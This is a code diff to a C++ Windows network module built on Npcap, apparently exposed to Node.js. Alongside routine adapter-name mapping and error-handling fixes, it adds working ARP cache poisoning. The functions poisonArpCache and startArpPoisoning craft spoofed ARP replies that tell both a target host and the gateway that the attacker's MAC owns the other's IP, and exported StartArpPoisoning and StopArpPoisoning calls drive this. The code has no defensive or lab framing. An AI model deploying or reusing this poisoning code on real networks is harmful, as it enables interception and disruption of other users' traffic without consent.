@@ -27,7 +27,7 @@ static std::string PWCHARToString(PWCHAR pwchar) {
 std::unique_ptr<ArpManager> g_arp_manager;
 
 // ARP Manager Implementation
-ArpManager::ArpManager() : pcap_handle(nullptr), is_initialized(false) {
+ArpManager::ArpManager() : pcap_handle(nullptr), is_initialized(false), poisoning_active(false) {
     initializeBuffers();
     resetPerformanceStats();
 }
@@ -49,17 +49,31 @@ bool ArpManager::initialize(const std::string& adapter_name) {
         return false;
     }
     
+    // Map Windows adapter name to Npcap device name (Phase 2 enhancement)
+    std::string pcap_device_name = mapAdapterNameToPcap(adapter_name);
+    if (pcap_device_name.empty()) {
+        printf("ARP Manager: Warning - Could not map adapter '%s' to pcap device name\n", adapter_name.c_str());
+        printf("ARP Manager: Attempting direct connection (legacy Phase 1 mode)\n");
+        pcap_device_name = adapter_name;
+    } else {
+        printf("ARP Manager: Mapped adapter '%s' to pcap device '%s'\n", adapter_name.c_str(), pcap_device_name.c_str());
+    }
+    
     // Open adapter for packet capture
     char errbuf[PCAP_ERRBUF_SIZE];
-    pcap_handle = pcap_open_live(adapter_name.c_str(), 65536, 1, 1000, errbuf);
+    pcap_handle = pcap_open_live(pcap_device_name.c_str(), 65536, 1, 1000, errbuf);
     
     if (pcap_handle == nullptr) {
-        // Log the error - this is expected for Phase 1 since adapter names from enumeration 
-        // are Windows display names, not pcap device names
-        printf("ARP Manager: Failed to open pcap adapter '%s': %s\n", adapter_name.c_str(), errbuf);
-        printf("ARP Manager: This is expected in Phase 1 - pcap requires device names like \\Device\\NPF_{GUID}\n");
+        printf("ARP Manager: Failed to open pcap adapter '%s': %s\n", pcap_device_name.c_str(), errbuf);
+        if (pcap_device_name != adapter_name) {
+            printf("ARP Manager: Phase 2 adapter mapping failed - this indicates Npcap configuration issues\n");
+        } else {
+            printf("ARP Manager: This is expected in Phase 1 - pcap requires device names like \\Device\\NPF_{GUID}\n");
+        }
         pcap_handle = nullptr; // Set to null to indicate no pcap
-        // Continue with initialization - Phase 2 will implement proper adapter name mapping
+        // Continue with initialization for fallback topology discovery
+    } else {
+        printf("ARP Manager: Successfully opened pcap device '%s'\n", pcap_device_name.c_str());
     }
     
     // Set non-blocking mode for performance (only if pcap is available)
@@ -124,6 +138,7 @@ std::vector<NetworkAdapter> ArpManager::enumerateAdapters() {
                 
                 NetworkAdapter netAdapter;
                 netAdapter.name = adapter->AdapterName;
+                netAdapter.pcap_name = mapAdapterNameToPcap(adapter->AdapterName);
                 netAdapter.description = PWCHARToString(adapter->Description);
                 netAdapter.friendly_name = PWCHARToString(adapter->FriendlyName);
                 netAdapter.is_active = (adapter->OperStatus == IfOperStatusUp);
@@ -213,10 +228,13 @@ NetworkInfo ArpManager::discoverNetworkTopology(const std::string& adapter_name)
         mask <<= 1;
     }
     
-    // Discover gateway MAC address
-    info.gateway_mac = discoverGatewayMac(adapter.gateway);
+    // Discover gateway MAC address (with timeout for performance)
+    if (!adapter.gateway.empty() && adapter.gateway != "0.0.0.0") {
+        info.gateway_mac = discoverGatewayMac(adapter.gateway);
+    }
     
-    info.is_valid = !info.gateway_mac.empty();
+    // Consider topology valid even without gateway MAC (can be discovered later)
+    info.is_valid = !info.local_ip.empty() && !info.gateway_ip.empty();
     
     return info;
 }
@@ -265,8 +283,13 @@ bool ArpManager::sendArpRequest(const std::string& target_ip) {
     memset(frame->arp.target_mac, 0, 6);    // Unknown
     memcpy(frame->arp.target_ip, target_ip_bytes, 4);
     
-    // Send packet
-    int result = pcap_sendpacket(pcap_handle, arp_buffer.data(), sizeof(ArpFrame));
+    // Send packet (check if pcap_handle is available)
+    int result = -1;
+    if (pcap_handle) {
+        result = pcap_sendpacket(pcap_handle, arp_buffer.data(), sizeof(ArpFrame));
+    } else {
+        setError("Pcap handle not available - ensure proper adapter initialization");
+    }
     
     auto end_time = std::chrono::high_resolution_clock::now();
     auto duration = std::chrono::duration_cast<std::chrono::microseconds>(end_time - start_time);
@@ -322,8 +345,13 @@ bool ArpManager::sendArpReply(const std::string& sender_ip, const std::string& t
     memcpy(frame->arp.target_mac, target_mac_bytes, 6);
     memcpy(frame->arp.target_ip, target_ip_bytes, 4);
     
-    // Send packet
-    int result = pcap_sendpacket(pcap_handle, arp_buffer.data(), sizeof(ArpFrame));
+    // Send packet (check if pcap_handle is available)
+    int result = -1;
+    if (pcap_handle) {
+        result = pcap_sendpacket(pcap_handle, arp_buffer.data(), sizeof(ArpFrame));
+    } else {
+        setError("Pcap handle not available - ensure proper adapter initialization");
+    }
     
     auto end_time = std::chrono::high_resolution_clock::now();
     auto duration = std::chrono::duration_cast<std::chrono::microseconds>(end_time - start_time);
@@ -331,7 +359,7 @@ bool ArpManager::sendArpReply(const std::string& sender_ip, const std::string& t
     bool success = (result == 0);
     updatePerformanceStats(true, duration.count() / 1000.0, success);
     
-    if (!success) {
+    if (!success && pcap_handle) {
         setError("Failed to send ARP reply: " + std::string(pcap_geterr(pcap_handle)));
     }
     
@@ -361,14 +389,49 @@ std::string ArpManager::discoverGatewayMac(const std::string& gateway_ip) {
         }
     }
     
-    // If not found in ARP table, send ARP request
-    if (sendArpRequest(gateway_ip)) {
-        // Wait briefly for response and check ARP table again
-        Sleep(100);
-        return discoverGatewayMac(gateway_ip);
+    // If not found in ARP table and we have pcap handle, try ARP request
+    if (pcap_handle && sendArpRequest(gateway_ip)) {
+        // Wait briefly for response and check ARP table again (avoid recursion)
+        Sleep(500);
+        
+        // Check ARP table one more time after request
+        if (result == ERROR_INSUFFICIENT_BUFFER) {
+            auto buffer = std::make_unique<char[]>(bufferSize);
+            PMIB_IPNETTABLE pIpNetTable = reinterpret_cast<PMIB_IPNETTABLE>(buffer.get());
+            
+            result = GetIpNetTable(pIpNetTable, &bufferSize, FALSE);
+            
+            if (result == NO_ERROR) {
+                struct in_addr gateway_addr;
+                inet_pton(AF_INET, gateway_ip.c_str(), &gateway_addr);
+                
+                for (DWORD i = 0; i < pIpNetTable->dwNumEntries; i++) {
+                    if (pIpNetTable->table[i].dwAddr == gateway_addr.s_addr) {
+                        return macToString(pIpNetTable->table[i].bPhysAddr);
+                    }
+                }
+            }
+        }
     }
     
+    // Return empty string if not found - this is acceptable
     return "";
+}
+
+bool ArpManager::refreshGatewayMac() {
+    if (!is_initialized || network_info.gateway_ip.empty()) {
+        return false;
+    }
+    
+    std::string new_gateway_mac = discoverGatewayMac(network_info.gateway_ip);
+    if (!new_gateway_mac.empty() && new_gateway_mac != "00:00:00:00:00:00") {
+        network_info.gateway_mac = new_gateway_mac;
+        printf("ARP Manager: Gateway MAC refreshed - %s (%s)\n", 
+               network_info.gateway_ip.c_str(), network_info.gateway_mac.c_str());
+        return true;
+    }
+    
+    return false;
 }
 
 // Utility functions
@@ -485,12 +548,15 @@ NetworkInfo ArpManager::discoverNetworkTopologyAlternative() {
                         info.interface_mac = "00:00:00:00:00:00";
                     }
                     
-                    // For gateway MAC, we'll need to discover it via ARP (set to zero for now)
-                    info.gateway_mac = "00:00:00:00:00:00";
+                    // Try to discover gateway MAC from ARP table (quick lookup)
+                    info.gateway_mac = discoverGatewayMac(info.gateway_ip);
+                    if (info.gateway_mac.empty()) {
+                        info.gateway_mac = "00:00:00:00:00:00"; // Default if not found
+                    }
                     
                     info.is_valid = true;
-                    printf("ARP Manager: Alternative topology discovery successful - IP: %s, Gateway: %s, Subnet: %s/%d\n",
-                           info.local_ip.c_str(), info.gateway_ip.c_str(), info.subnet_mask.c_str(), info.subnet_cidr);
+                    printf("ARP Manager: Alternative topology discovery successful - IP: %s, Gateway: %s (%s), Subnet: %s/%d\n",
+                           info.local_ip.c_str(), info.gateway_ip.c_str(), info.gateway_mac.c_str(), info.subnet_mask.c_str(), info.subnet_cidr);
                     break;
                 }
             }
@@ -534,6 +600,210 @@ void ArpManager::updatePerformanceStats(bool is_send, double time_ms, bool succe
     }
 }
 
+// Phase 2: Adapter name mapping implementation
+std::string ArpManager::mapAdapterNameToPcap(const std::string& windows_adapter_name) {
+    // Get all pcap devices
+    char errbuf[PCAP_ERRBUF_SIZE];
+    pcap_if_t* alldevs;
+    pcap_if_t* device;
+    
+    if (pcap_findalldevs(&alldevs, errbuf) == -1) {
+        printf("ARP Manager: Failed to enumerate pcap devices: %s\n", errbuf);
+        return "";
+    }
+    
+    std::string pcap_name;
+    
+    // Look for device that matches our adapter name
+    for (device = alldevs; device != nullptr; device = device->next) {
+        std::string device_name = device->name;
+        
+        // Npcap device names follow pattern: \Device\NPF_{GUID}
+        // Windows adapter names are just the GUID: {GUID}
+        if (device_name.find("\\Device\\NPF_") == 0) {
+            // Extract GUID from pcap device name
+            size_t guid_start = device_name.find_last_of('_') + 1;
+            if (guid_start != std::string::npos) {
+                std::string device_guid = device_name.substr(guid_start);
+                
+                // Check if this GUID matches our adapter name
+                if (windows_adapter_name.find(device_guid) != std::string::npos ||
+                    device_guid.find(windows_adapter_name) != std::string::npos) {
+                    pcap_name = device_name;
+                    printf("ARP Manager: Found matching pcap device - GUID: %s -> Device: %s\n", 
+                           device_guid.c_str(), device_name.c_str());
+                    break;
+                }
+            }
+        }
+    }
+    
+    pcap_freealldevs(alldevs);
+    
+    if (pcap_name.empty()) {
+        printf("ARP Manager: No matching pcap device found for adapter: %s\n", windows_adapter_name.c_str());
+    }
+    
+    return pcap_name;
+}
+
+std::vector<std::string> ArpManager::enumeratePcapDevices() {
+    std::vector<std::string> devices;
+    char errbuf[PCAP_ERRBUF_SIZE];
+    pcap_if_t* alldevs;
+    pcap_if_t* device;
+    
+    if (pcap_findalldevs(&alldevs, errbuf) == -1) {
+        printf("ARP Manager: Failed to enumerate pcap devices: %s\n", errbuf);
+        return devices;
+    }
+    
+    for (device = alldevs; device != nullptr; device = device->next) {
+        devices.push_back(device->name);
+        printf("ARP Manager: Found pcap device: %s", device->name);
+        if (device->description) {
+            printf(" (%s)", device->description);
+        }
+        printf("\n");
+    }
+    
+    pcap_freealldevs(alldevs);
+    return devices;
+}
+
+// Phase 2: ARP poisoning implementation
+bool ArpManager::startArpPoisoning(const std::string& target_ip, const std::string& target_mac) {
+    if (!is_initialized || !pcap_handle) {
+        setError("ARP Manager not properly initialized for poisoning operations");
+        return false;
+    }
+    
+    // Ensure we have gateway MAC for poisoning - refresh if needed
+    if (network_info.gateway_mac.empty() || network_info.gateway_mac == "00:00:00:00:00:00") {
+        printf("ARP Manager: Gateway MAC not available, attempting to refresh...\n");
+        refreshGatewayMac();
+    }
+    
+    // Check if target is already being poisoned
+    for (const auto& target : poisoning_targets) {
+        if (target.ip == target_ip && target.is_active) {
+            printf("ARP Manager: Target %s is already being poisoned\n", target_ip.c_str());
+            return true;
+        }
+    }
+    
+    // Add target to poisoning list
+    PoisoningTarget new_target;
+    new_target.ip = target_ip;
+    new_target.mac = target_mac;
+    new_target.is_active = true;
+    poisoning_targets.push_back(new_target);
+    
+    poisoning_active = true;
+    
+    printf("ARP Manager: Started ARP poisoning for target %s (%s)\n", target_ip.c_str(), target_mac.c_str());
+    
+    // Immediately send initial poisoning packets
+    return poisonArpCache(target_ip, target_mac, network_info.gateway_ip, network_info.interface_mac) &&
+           poisonArpCache(network_info.gateway_ip, network_info.gateway_mac, target_ip, network_info.interface_mac);
+}
+
+bool ArpManager::stopArpPoisoning(const std::string& target_ip) {
+    bool found = false;
+    
+    for (auto& target : poisoning_targets) {
+        if (target.ip == target_ip && target.is_active) {
+            target.is_active = false;
+            found = true;
+            
+            // Restore legitimate ARP entries
+            printf("ARP Manager: Restoring legitimate ARP entries for %s\n", target_ip.c_str());
+            
+            // Send legitimate ARP replies to restore normal connectivity
+            poisonArpCache(target_ip, target.mac, network_info.gateway_ip, network_info.gateway_mac);
+            poisonArpCache(network_info.gateway_ip, network_info.gateway_mac, target_ip, target.mac);
+            
+            break;
+        }
+    }
+    
+    // Check if any targets are still active
+    bool any_active = false;
+    for (const auto& target : poisoning_targets) {
+        if (target.is_active) {
+            any_active = true;
+            break;
+        }
+    }
+    
+    if (!any_active) {
+        poisoning_active = false;
+        printf("ARP Manager: All ARP poisoning stopped\n");
+    }
+    
+    return found;
+}
+
+bool ArpManager::poisonArpCache(const std::string& victim_ip, const std::string& victim_mac, 
+                               const std::string& spoof_ip, const std::string& our_mac) {
+    if (!is_initialized || !pcap_handle) {
+        setError("ARP Manager not properly initialized for poisoning operations");
+        return false;
+    }
+    
+    auto start_time = std::chrono::high_resolution_clock::now();
+    
+    // Parse parameters
+    uint8_t victim_ip_bytes[4], spoof_ip_bytes[4];
+    uint8_t victim_mac_bytes[6], our_mac_bytes[6];
+    
+    if (!stringToIp(victim_ip, victim_ip_bytes) ||
+        !stringToIp(spoof_ip, spoof_ip_bytes) ||
+        !stringToMac(victim_mac, victim_mac_bytes) ||
+        !stringToMac(our_mac, our_mac_bytes)) {
+        setError("Invalid parameters for ARP poisoning");
+        return false;
+    }
+    
+    // Prepare ARP poisoning frame (spoofed reply)
+    ArpFrame* frame = reinterpret_cast<ArpFrame*>(arp_buffer.data());
+    memset(frame, 0, sizeof(ArpFrame));
+    
+    // Ethernet header - send directly to victim
+    memcpy(frame->eth.dest_mac, victim_mac_bytes, 6);
+    memcpy(frame->eth.src_mac, our_mac_bytes, 6);
+    frame->eth.ethertype = htons(0x0806); // ARP
+    
+    // ARP packet - claim we are the spoofed IP
+    frame->arp.hardware_type = htons(1);    // Ethernet
+    frame->arp.protocol_type = htons(0x0800); // IPv4
+    frame->arp.hardware_len = 6;
+    frame->arp.protocol_len = 4;
+    frame->arp.operation = htons(2);        // Reply (unsolicited)
+    memcpy(frame->arp.sender_mac, our_mac_bytes, 6);      // Our MAC
+    memcpy(frame->arp.sender_ip, spoof_ip_bytes, 4);      // IP we're spoofing
+    memcpy(frame->arp.target_mac, victim_mac_bytes, 6);   // Victim's MAC
+    memcpy(frame->arp.target_ip, victim_ip_bytes, 4);     // Victim's IP
+    
+    // Send poisoning packet
+    int result = pcap_sendpacket(pcap_handle, arp_buffer.data(), sizeof(ArpFrame));
+    
+    auto end_time = std::chrono::high_resolution_clock::now();
+    auto duration = std::chrono::duration_cast<std::chrono::microseconds>(end_time - start_time);
+    
+    bool success = (result == 0);
+    updatePerformanceStats(true, duration.count() / 1000.0, success);
+    
+    if (!success) {
+        setError("Failed to send ARP poisoning packet: " + std::string(pcap_geterr(pcap_handle)));
+    } else {
+        printf("ARP Manager: Poisoned %s -> told %s that %s is at %s\n", 
+               victim_ip.c_str(), victim_ip.c_str(), spoof_ip.c_str(), our_mac.c_str());
+    }
+    
+    return success;
+}
+
 // C++ function implementations for N-API exports
 std::vector<NetworkAdapter> GetNetworkAdapters() {
     if (!g_arp_manager) {
@@ -574,4 +844,26 @@ ArpManager::PerformanceStats GetArpPerformanceStats() {
         return ArpManager::PerformanceStats{};
     }
     return g_arp_manager->getPerformanceStats();
+}
+
+// Phase 2 C++ function implementations for N-API exports
+bool StartArpPoisoning(const std::string& target_ip, const std::string& target_mac) {
+    if (!g_arp_manager) {
+        return false;
+    }
+    return g_arp_manager->startArpPoisoning(target_ip, target_mac);
+}
+
+bool StopArpPoisoning(const std::string& target_ip) {
+    if (!g_arp_manager) {
+        return false;
+    }
+    return g_arp_manager->stopArpPoisoning(target_ip);
+}
+
+std::vector<std::string> EnumeratePcapDevices() {
+    if (!g_arp_manager) {
+        g_arp_manager = std::make_unique<ArpManager>();
+    }
+    return g_arp_manager->enumeratePcapDevices();
 }
